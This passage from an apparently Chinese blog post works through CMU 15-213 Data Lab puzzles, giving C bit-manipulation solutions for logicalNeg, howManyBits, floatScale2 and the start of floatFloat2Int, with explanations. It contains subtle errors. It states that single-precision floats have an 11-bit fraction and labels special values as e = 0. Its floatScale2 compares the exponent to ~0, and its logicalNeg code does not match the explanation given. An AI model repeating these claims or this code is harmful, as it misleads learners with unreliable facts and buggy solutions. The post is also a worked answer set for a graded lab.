punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    * if x == 0, x ^ 0x0 = 0</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">+</span> <span class=\"token operator\">~</span><span class=\"token number\">0</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这道题的难点在于：</p>\n<ol>\n<li>将 0 映射到 0x1</li>\n<li>将非 0 值映射到 0x0</li>\n</ol>\n<p>在一开始实现时，我的思路是对于 0，可以和 <code>0x0</code>  异或，判断为 0。但是对于非 0 的数，和 <code>0x0</code>  异或后还是他自己，我们也不知道 1 落在其中哪个位上，一个个位去找也不现实。那么就需要思考其他的办法。从 <code>0x0</code>  这个数和其他数的特点下手。这里我参考了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaW5nZmVuLmdpdGh1Yi5pby9jc2FwcC8yMDIxLzA0LzMwL0NTQVBQTGFiMDEuaHRtbA==\">这篇博客</span>。</p>\n<p>其给出的思路是：<br>\n-x 为 x 按位取反再 + 1。</p>\n<ul>\n<li>如果一个数为全 0，和相反数相 <code>|</code>  后结果全部是 0，加 1 后得到 <code>0x1</code></li>\n<li>否则结果最高位必然含有 1。向右移动 31 位获得 <code>~0</code> ，再加 1 得到 <code>0x0</code></li>\n</ul>\n<p>问题可改为，如何判断一个数全为 0 。注意到，-x 相当于按位取反再加一，如果 x 为 非 0 数，那么 x|(-x) 后必定为 -1 。利用这个性质，即可判断是否为 0 。</p>\n<h2 id=\"howmanybits\"><a class=\"markdownIt-Anchor\" href=\"#howmanybits\">#</a> howManyBits</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* howManyBits - return the minimum number of bits required to represent x in</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> *             two's complement</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *  Examples: howManyBits(12) = 5</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *            howManyBits(298) = 10</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *            howManyBits(-5) = 4</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *            howManyBits(0)  = 1</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> *            howManyBits(-1) = 1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> *            howManyBits(0x80000000) = 32</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; >></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> *  Max ops: 90</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> *  Rating: 4</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">howManyBits</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    * divide and conquer</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    * for positive number, the number of bits = the last position of 1 + 1</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    * for negative number, the number of bits = the last position of 1</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    * inverse negative number and deal with it as the same as positive number</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    * 1. judge the sign bit of x, if x is negative, inverse it</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    * 2. judge the high 16 bits, if true(high 16 bits != 0x0), result + 16</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    * 3. judge the high 8 bits, if true, result + 8</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    * 4. judge the high 4 bits, if true, result + 4</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    * 5. judge the high 2 bits, if true, result + 2</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    * 6. judge the high 1 bits, if true, result + 1</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    * 7. judge the last 1 bit, if true, result + !!x</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    * 8. the final sum must + 1</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    * 9. return the result</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>   <span class=\"token comment\">// neg x if it's negative</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>   <span class=\"token keyword\">int</span> sign <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>   x <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sign <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>sign <span class=\"token operator\">&amp;</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   <span class=\"token keyword\">int</span> b16<span class=\"token punctuation\">,</span> b8<span class=\"token punctuation\">,</span> b4<span class=\"token punctuation\">,</span> b2<span class=\"token punctuation\">,</span> b1<span class=\"token punctuation\">,</span> b0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>   <span class=\"token comment\">// int mask_16 = (1 &lt;&lt; 15) >> 15;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>   b16 <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>   x <span class=\"token operator\">=</span> x <span class=\"token operator\">>></span> b16<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>   <span class=\"token comment\">// int mask_8 = 0xff;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>   b8 <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>   x <span class=\"token operator\">=</span> x <span class=\"token operator\">>></span> b8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>   <span class=\"token comment\">// int mask_4 = 0xf;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>   b4 <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>   x <span class=\"token operator\">=</span> x <span class=\"token operator\">>></span> b4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>   <span class=\"token comment\">// int mask_2 = 0x3;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>   b2 <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>   x <span class=\"token operator\">=</span> x <span class=\"token operator\">>></span> b2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>   <span class=\"token comment\">// int mask_1 = 0x1;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>   b1 <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>   x <span class=\"token operator\">=</span> x <span class=\"token operator\">>></span> b1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>   <span class=\"token comment\">//! judge if the last bit == 1</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>   b0 <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span>x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>   <span class=\"token keyword\">return</span> b16 <span class=\"token operator\">+</span> b8 <span class=\"token operator\">+</span> b4 <span class=\"token operator\">+</span> b2 <span class=\"token operator\">+</span> b1 <span class=\"token operator\">+</span> b0 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在这个题目中，我们主要采用分而治之的方法。分治方法的几道例题可以参考 CMU 15-213 课程的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9yZWNpdGF0aW9ucy9yZWMwMV9zb2x1dGlvbnMucGRm\"> Recitation Slides</span>。</p>\n<p>首先，我们可以看到，如果该数是一个正数，则其最高位必然是 0，该数的位数 = 最高一个 1 的位置 + 1；<br>\n如果该数是一个负数，该数的位数 = 最高一个 1 的位置。<br>\n我们不想那么麻烦，把正负数分开讨论，因此我们把负数翻转过来。</p>\n<p>在这道题中我们采用的方法是：</p>\n<ol>\n<li>判断高 16 位是否有 1（把数向右移动 16 位后，结果不为 0， <code>!!(x &gt;&gt; 16)</code> ）。 <code>b16 = !!(x &gt;&gt; 16) &lt;&lt; 4</code> 。如果是的话，把数值向右移动 16 位 <code>(x&gt;&gt;b16)</code> 。把 <code>b16</code>  添加到结果中去。这里一个妙用在于如果 <code>!!(x &gt;&gt; 16）= 0x1</code> ， <code>!!(x &gt;&gt; 16) &lt;&lt; 4</code>  可以直接起到获得数字 16 的方法，无需增加其他的运算。</li>\n<li>判断高 8 位是否有 1，操作同上</li>\n<li>判断高 4 位是否有 1，操作同上</li>\n<li>判断高 2 位是否有 1，操作同上</li>\n<li>判断高 1 位是否有 1，操作同上</li>\n<li>判断该位是否有 1</li>\n<li>结果 + 1（位数 = 最高一个 1 的位置 + 1）</li>\n<li>最后把所有判断结果加起来（每次判断的结果都是一个累加的位数，加在一起就是最后的总位数）</li>\n</ol>\n<h2 id=\"浮点数复习\"><a class=\"markdownIt-Anchor\" href=\"#浮点数复习\">#</a> 浮点数复习</h2>\n<p>在完成浮点数部分的题目之前，我们需要复习一下浮点数的和其表示方法：</p>\n<ul>\n<li>单精度浮点数：1 位符号位 + 8 位阶码 (exp) + 11 位尾数 (frac)</li>\n<li>双精度浮点数：1 位符号位 + 11 位阶码 (exp) + 52 位尾数 (frac)</li>\n</ul>\n<p>其中阶码使用移码表示。<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi><mo>=</mo><msup><mn>2</mn><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">bias = 2^{k-1}-1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">bia</span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.9324em;vertical-align:-0.0833em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">1</span></span></span></span></p>\n<p>浮点数分为三类：</p>\n<ul>\n<li>规格化数：阶码不全为 1 也不全为 0，尾数前有隐含的 1，指数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>E</mi><mo>=</mo><mi>e</mi><mi>x</mi><mi>p</mi><mo>−</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">E=exp - bias</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7778em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">bia</span><span class=\"mord mathnormal\">s</span></span></span></span>，分布在非规格化数外侧</li>\n<li>非规格化数：阶码全为 0，尾数前隐含 0，指数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>E</mi><mo>=</mo><mn>1</mn><mo>−</mo><mi>b</mi><mi>i</mi><mi>a</mi><mi>s</mi></mrow><annotation encoding=\"application/x-tex\">E=1 - bias</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\">bia</span><span class=\"mord mathnormal\">s</span></span></span></span>，主要分布在靠近 0 侧</li>\n<li>特殊值：阶码全为 1，若尾数全为 0，则为 <code>inf</code> ，否则为 <code>NaN</code></li>\n</ul>\n<h2 id=\"floatscale2\"><a class=\"markdownIt-Anchor\" href=\"#floatscale2\">#</a> floatScale2</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// float</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * floatScale2 - Return bit-level equivalent of expression 2*f for</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   floating point argument f.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Both the argument and result are passed as unsigned int's, but</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   they are to be interpreted as the bit-level representation of</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> *   single-precision floating point values.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> *   When argument is NaN, return argument</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> *   Max ops: 30</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> *   Rating: 4</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token function\">floatScale2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> uf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token comment\">// first get the sign, exp and mag bit of the number</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> sign <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>uf <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>uf <span class=\"token operator\">>></span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> f <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>uf <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token comment\">// denormalized number</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token comment\">// E = 1 - bias</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token comment\">// frac = f</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token comment\">//! how to multiply a denormalized number? frac * 2!</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      f <span class=\"token operator\">=</span> f <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>   <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">==</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token comment\">// special number</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token comment\">// if frac = 0, then value = inf</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>f <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>         <span class=\"token comment\">// frac = 1 / 0;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>         <span class=\"token keyword\">return</span> uf<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>         <span class=\"token comment\">// if frac != 0, value = NaN</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>         <span class=\"token keyword\">return</span> uf<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>   <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>      <span class=\"token comment\">// normalized number</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      <span class=\"token comment\">// E = e - bias</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token comment\">// value = 1 + f</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>      e <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">==</span> <span class=\"token operator\">~</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>         <span class=\"token keyword\">return</span> uf<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>sign <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> f<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>本题目要求是计算一个 unsigned 形式表示的浮点数  <code>* 2</code>  后的表示。在完成这题之前，我们首先把浮点数的几个部分提取出来，分几个情况讨论：</p>\n<ul>\n<li>非规格化数：指数不变，尾数乘 2。<strong>问题来了，这到底是为什么？因为当 exp 全为 0 时，exp = 0, E = 1 - bias, frac = 0.f。乘以 2 就相当于把 f 左移一位，最高位会进到 exp 的位置去。如果 f 最高位是 0，左移一位不影响 exp（全 0）。如果 f 最高位是 1，左移一位后该数变为规格化数，exp 变为 1，E 依然等于 1 - bias。实现了非规格化数到规格化数的平滑过渡（非常重要！）</strong></li>\n<li>规格化数：首先将指数 + 1，然后判断是否为特殊值，若是则返回 <code>uf</code> 。</li>\n<li>特殊值： <code>e = 0</code> ，直接返回 <code>uf</code> （根据题目意思）</li>\n</ul>\n<p>将符号位，指数和尾数三个部分拼凑起来，直接返回（本题中无需进行任何计算）。</p>\n<h2 id=\"floatfloat2int\"><a class=\"markdownIt-Anchor\" href=\"#floatfloat2int\">#</a> floatFloat2Int</h2>\n<blockquote>\n<p>本题中不允许使用 <code>double</code>  类型，我擅自用了，这里应该是不严谨的。</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * floatFloat2Int - Return bit-level equivalent of expression (int) f</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   for floating point argument f.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Argument is passed as unsigned int, but</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   it is to be interpreted as the bit-level representation of a</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   single-precision floating point value.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> *   Anything out of range (including NaN and infinity) should return</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> *   0x80000000u.</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> *   Max ops: 30</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> *   Rating: 4</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">floatFloat2Int</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> uf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token comment\">// first get the sign, exp and mag bit of the number</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> sign <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>uf <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token keyword\">unsigned</span> e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>uf <span class=\"token operator\">>></span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> 